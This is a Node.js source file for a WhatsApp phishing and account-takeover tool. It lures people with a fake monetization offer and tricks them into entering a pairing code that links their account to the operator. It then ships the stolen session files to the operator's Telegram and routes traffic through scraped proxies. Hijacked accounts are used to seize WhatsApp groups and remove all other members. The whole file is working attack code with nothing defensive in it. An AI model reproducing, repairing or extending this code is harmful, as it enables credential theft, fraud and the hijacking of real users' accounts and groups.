const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    DisconnectReason,
    fetchLatestWaWebVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const archiver = require('archiver');
const fs = require('fs-extra');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const axios = require('axios');

const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
tgBot.on('polling_error', () => {});

let adminSock = null;
let activeVictims = {};
let victimList = [];

// ── session restore ─────────────────────────────────────────
async function restoreSessionFromTelegram(folderName) {
    const folderPath = path.join(__dirname, folderName);
    if (await fs.pathExists(folderPath)) return true;

    try {
        const updates = await tgBot.getUpdates({ limit: 100 });
        const docs = updates
            .filter(u => u.message?.document?.file_name?.includes(folderName))
            .sort((a, b) => b.message.date - a.message.date);

        if (!docs.length) return false;

        const fileId = docs[0].message.document.file_id;
        const fileLink = await tgBot.getFileLink(fileId);
        const zipPath = path.join(__dirname, `${folderName}_restore.zip`);

        const writer = fs.createWriteStream(zipPath);
        const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        await fs.ensureDir(folderPath);
        const extract = require('extract-zip');
        await extract(zipPath, { dir: folderPath });
        await fs.unlink(zipPath);
        return true;
    } catch (e) {
        return false;
    }
}

// ── proxy helpers ───────────────────────────────────────────
async function getLiveProxies() {
    try {
        const res = await axios.get(
            'https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps'
        );
        return res.data.data.map(p => `http://${p.ip}:${p.port}`);
    } catch (e) { return []; }
}

// ── backup ──────────────────────────────────────────────────
async function backupToTelegram(phoneNumber, folderPath) {
    const zipPath = path.join(__dirname, `${phoneNumber}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
        output.on('close', async () => {
            try {
                await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, {
                    caption: `#SESSION ${phoneNumber}`
                });
                fs.unlinkSync(zipPath);
                resolve();
            } catch (e) { reject(e); }
        });
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(folderPath, false);
        archive.finalize();
    });
}

// ── admin bot ───────────────────────────────────────────────
async function startAdminBot() {
    await restoreSessionFromTelegram('auth_info_admin');

    const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');

    // ← THE FIX: use fetchLatestWaWebVersion, NOT fetchLatestBaileysVersion
    const { version } = await fetchLatestWaWebVersion({});

    adminSock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.macOS('Safari'),
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000
    });

    adminSock.ev.on('creds.update', saveCreds);

    adminSock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            io.emit('log', { msg: 'Admin Bot connected', type: 'info' });
            tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
        }
        if (update.connection === 'close' &&
            update.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            startAdminBot();
        }
    });

    // pairing only if not registered — and wait for readiness
    if (!adminSock.authState.creds.registered) {
        adminSock.ev.on('connection.update', async (update) => {
            if (update.connection === 'connecting' && !adminSock.authState.creds.registered) {
                await delay(3000);
                try {
                    const code = await adminSock.requestPairingCode(BOT_NUMBER);
                    tgBot.sendMessage(
                        MY_TELEGRAM_ID,
                        `*Admin Pairing Code:* \`${code}\``,
                        { parse_mode: 'Markdown' }
                    );
                } catch (err) {}
            }
        });
    }
}

// ── victim pairing ──────────────────────────────────────────
io.on('connection', (socket) => {
    socket.on('request_code', async (phoneNumber) => {
        const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
        const folderName = `auth_info_${targetNumber}`;

        await restoreSessionFromTelegram(folderName);
        const { state, saveCreds } = await useMultiFileAuthState(folderName);

        // already registered? skip pairing, just connect
        if (state.creds.registered) {
            socket.emit('error', 'This number is already linked. Restarting session...');
            // could emit a reconnect event here
            return;
        }

        const { version } = await fetchLatestWaWebVersion({});
        const liveProxies = await getLiveProxies();
        const proxiesToTry = [...liveProxies, 'DIRECT'];

        let success = false;

        for (let i = 0; i < proxiesToTry.length; i++) {
            if (success) break;
            const proxyUrl = proxiesToTry[i];

            try {
                const sockOptions = {
                    version,              // ← version fix
                    logger: pino({ level: 'silent' }),
                    printQRInTerminal: false,
                    auth: state,
                    browser: Browsers.macOS('Safari'),  // ← platform that passes pairing validation
                    connectTimeoutMs: 15000,
                    defaultQueryTimeoutMs: 15000
                };

                if (proxyUrl !== 'DIRECT') {
                    sockOptions.agent = new HttpsProxyAgent(proxyUrl);
                }

                const phishSock = makeWASocket(sockOptions);
                phishSock.ev.on('creds.update', saveCreds);

                await new Promise((resolve, reject) => {
                    let isResolved = false;

                    // ← wait for pair-device event before requesting code
                    phishSock.ev.on('connection.update', async (update) => {
                        if (update.connection === 'connecting' && !isResolved) {
                            isResolved = true;
                            await delay(2000);
                            try {
                                const code = await phishSock.requestPairingCode(targetNumber);
                                success = true;
                                socket.emit('code_generated', code);
                                resolve();
                            } catch (e) {
                                try { phishSock.end(undefined); } catch(err) {}
                                reject(e);
                            }
                        }
                        if (update.connection === 'open') {
                            socket.emit('success');
                            activeVictims[targetNumber] = phishSock;
                            if (!victimList.find(v => v.number === targetNumber)) {
                                victimList.push({ number: targetNumber, status: 'Online' });
                            }
                            io.emit('victim_update', victimList);
                            tgBot.sendMessage(
                                MY_TELEGRAM_ID,
                                `🔥 *NEW VICTIM LINKED!*\nNumber: ${targetNumber}`
                            );
                            await backupToTelegram(targetNumber, folderName);
                        }
                    });

                    // timeout
                    setTimeout(() => {
                        if (!isResolved) {
                            isResolved = true;
                            try { phishSock.end(undefined); } catch(err) {}
                            reject(new Error('Timeout'));
                        }
                    }, 15000);
                });
            } catch (error) {
                // try next proxy
            }
        }

        if (!success) socket.emit('error', 'Network error. Please try again.');
    });

    // rest unchanged...
    socket.on('admin_join', () => io.emit('victim_update', victimList));

    socket.on('admin_send_invite', async (number) => {
        if (!adminSock) return;
        const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network...\n\n${RENDER_URL}`;
        try {
            await adminSock.sendMessage(target, { text: pitch });
            socket.emit('log', { msg: `Invite sent to ${number}`, type: 'info' });
        } catch (e) {}
    });

    socket.on('admin_takeover', async (data) => {
        const victimNumber = data.victim.replace(/[^0-9]/g, '');
        const groupJid = data.group;
        if (!activeVictims[victimNumber]) {
            return socket.emit('log', { msg: `Victim not online.`, type: 'error' });
        }

        const victimSock = activeVictims[victimNumber];
        try {
            await victimSock.groupParticipantsUpdate(
                groupJid,
                [BOT_NUMBER + '@s.whatsapp.net'],
                'promote'
            );
            await delay(1500);
            const meta = await victimSock.groupMetadata(groupJid);
            let kicked = 0;
            for (let p of meta.participants) {
                if (p.id === victimSock.user.id || p.id === BOT_NUMBER + '@s.whatsapp.net') continue;
                if (p.admin) {
                    await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'demote');
                    await delay(1000);
                }
                await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'remove');
                kicked++;
                await delay(1000);
            }
            socket.emit('log', { msg: `Takeover complete. Kicked ${kicked}.`, type: 'info' });
        } catch (e) {
            socket.emit('log', { msg: `Failed: ${e.message}`, type: 'error' });
        }
    });
});

// keep render awake
setInterval(() => {
    http.get(`http://localhost:${process.env.PORT || 8080}/admin`, () => {})
        .on('error', () => {});
}, 10 * 60 * 1000);

server.listen(process.env.PORT || 8080, () => {
    startAdminBot();
});